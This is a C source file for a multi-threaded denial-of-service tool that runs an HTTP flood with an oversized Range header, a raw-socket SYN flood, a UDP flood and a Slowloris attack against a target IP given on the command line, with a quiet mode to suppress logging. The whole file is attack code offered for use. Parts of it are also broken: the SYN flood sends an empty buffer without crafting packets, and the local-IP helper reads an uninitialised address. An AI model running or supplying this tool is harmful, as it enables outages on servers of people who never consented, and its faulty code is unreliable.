#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <time.h>

#define MAX_PROCESSES 4096
#define BUFFER_SIZE 8192
#define UDP_PORT 12345

// Global variables
volatile int payload_count = 0;
int quiet_mode = 0; // 0 = false, 1 = true
pthread_mutex_t lock;

// Function prototypes
void *http_flood(void *arg);
void *tcp_syn_flood(void *arg);
void *udp_flood(void *arg);
void *slowloris(void *arg);
void log_payload(const char *payload_name, const char *source_ip, const char *target_ip, int count);
char *get_local_ip();

// Function to send HTTP flood payload
void *http_flood(void *arg) {
    const char *host = (const char *)arg;
    const char *payload = "GET / HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n";
    char full_payload[BUFFER_SIZE];
    int sockfd;
    struct sockaddr_in serv_addr;

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            continue;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(80);

        if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
            perror("Invalid address/Address not supported");
            close(sockfd);
            continue;
        }

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("Connection failed");
            close(sockfd);
            continue;
        }

        snprintf(full_payload, sizeof(full_payload), payload, host);
        send(sockfd, full_payload, strlen(full_payload), 0);
        close(sockfd);

        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("HTTP Flood", get_local_ip(), host, payload_count);
        }
        pthread_mutex_unlock(&lock);

        usleep(500000); // Sleep for 0.5 seconds
    }

    return NULL;
}

// Function to send TCP SYN flood payload
void *tcp_syn_flood(void *arg) {
    const char *host = (const char *)arg;
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE];

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(0); // Random port

    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sockfd);
        return NULL;
    }

    while (1) {
        // Craft a SYN packet (simplified; real implementation needs raw socket handling)
        memset(buffer, 0, sizeof(buffer));
        sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        
        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("TCP SYN Flood", get_local_ip(), host, payload_count);
        }
        pthread_mutex_unlock(&lock);

        usleep(500000); // Sleep for 0.5 seconds
    }

    close(sockfd);
    return NULL;
}

// Function to send UDP flood payload
void *udp_flood(void *arg) {
    const char *host = (const char *)arg;
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(UDP_PORT);

    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sockfd);
        return NULL;
    }

    while (1) {
        snprintf(buffer, sizeof(buffer), "Flooding UDP packet to %s", host);
        sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        
        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("UDP Flood", get_local_ip(), host, payload_count);
        }
        pthread_mutex_unlock(&lock);

        usleep(500000); // Sleep for 0.5 seconds
    }

    close(sockfd);
    return NULL;
}

// Function to send Slowloris payload
void *slowloris(void *arg) {
    const char *host = (const char *)arg;
    const char *payload = "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 10000\r\n\r\n";
    char full_payload[BUFFER_SIZE];
    int sockfd;
    struct sockaddr_in serv_addr;

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            continue;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(80);

        if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
            perror("Invalid address/Address not supported");
            close(sockfd);
            continue;
        }

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("Connection failed");
            close(sockfd);
            continue;
        }

        snprintf(full_payload, sizeof(full_payload), payload, host);
        send(sockfd, full_payload, strlen(full_payload), 0);
        // Slowly send data in chunks
        for (int i = 0; i < 1000; i++) {
            send(sockfd, ".", 1, 0);
            usleep(1000); // Sleep for 1ms between each byte
        }
        close(sockfd);

        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("Slowloris", get_local_ip(), host, payload_count);
        }
        pthread_mutex_unlock(&lock);
        
        usleep(500000); // Sleep for 0.5 seconds
    }

    return NULL;
}

// Function to log payload details
void log_payload(const char *payload_name, const char *source_ip, const char *target_ip, int count) {
    printf("Payload: %s\nNumber Sent: %d\nSource IP: %s\nTarget IP: %s\n\n",
           payload_name, count, source_ip, target_ip);
}

// Function to get the local IP address
char *get_local_ip() {
    static char ip[INET_ADDRSTRLEN];
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    inet_ntop(AF_INET, &sa.sin_addr, ip, INET_ADDRSTRLEN);
    return ip;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s [-q|--quiet] <IP_ADDRESS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *host;
    if (argc == 2) {
        host = argv[1];
    } else if (argc == 3 && (strcmp(argv[1], "-q") == 0 || strcmp(argv[1], "--quiet") == 0)) {
        quiet_mode = 1;
        host = argv[2];
    } else {
        fprintf(stderr, "Usage: %s [-q|--quiet] <IP_ADDRESS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    pthread_t threads[4];

    // Initialize mutex
    pthread_mutex_init(&lock, NULL);

    // Create threads for different attack types
    pthread_create(&threads[0], NULL, http_flood, (void *)host);
    pthread_create(&threads[1], NULL, tcp_syn_flood, (void *)host);
    pthread_create(&threads[2], NULL, udp_flood, (void *)host);
    pthread_create(&threads[3], NULL, slowloris, (void *)host);

    // Wait for all threads to complete (infinite loop will keep them running)
    for (int i = 0; i < 4; i++) {
        pthread_join(threads[i], NULL);
    }

    // Destroy mutex
    pthread_mutex_destroy(&lock);

    return 0;
}

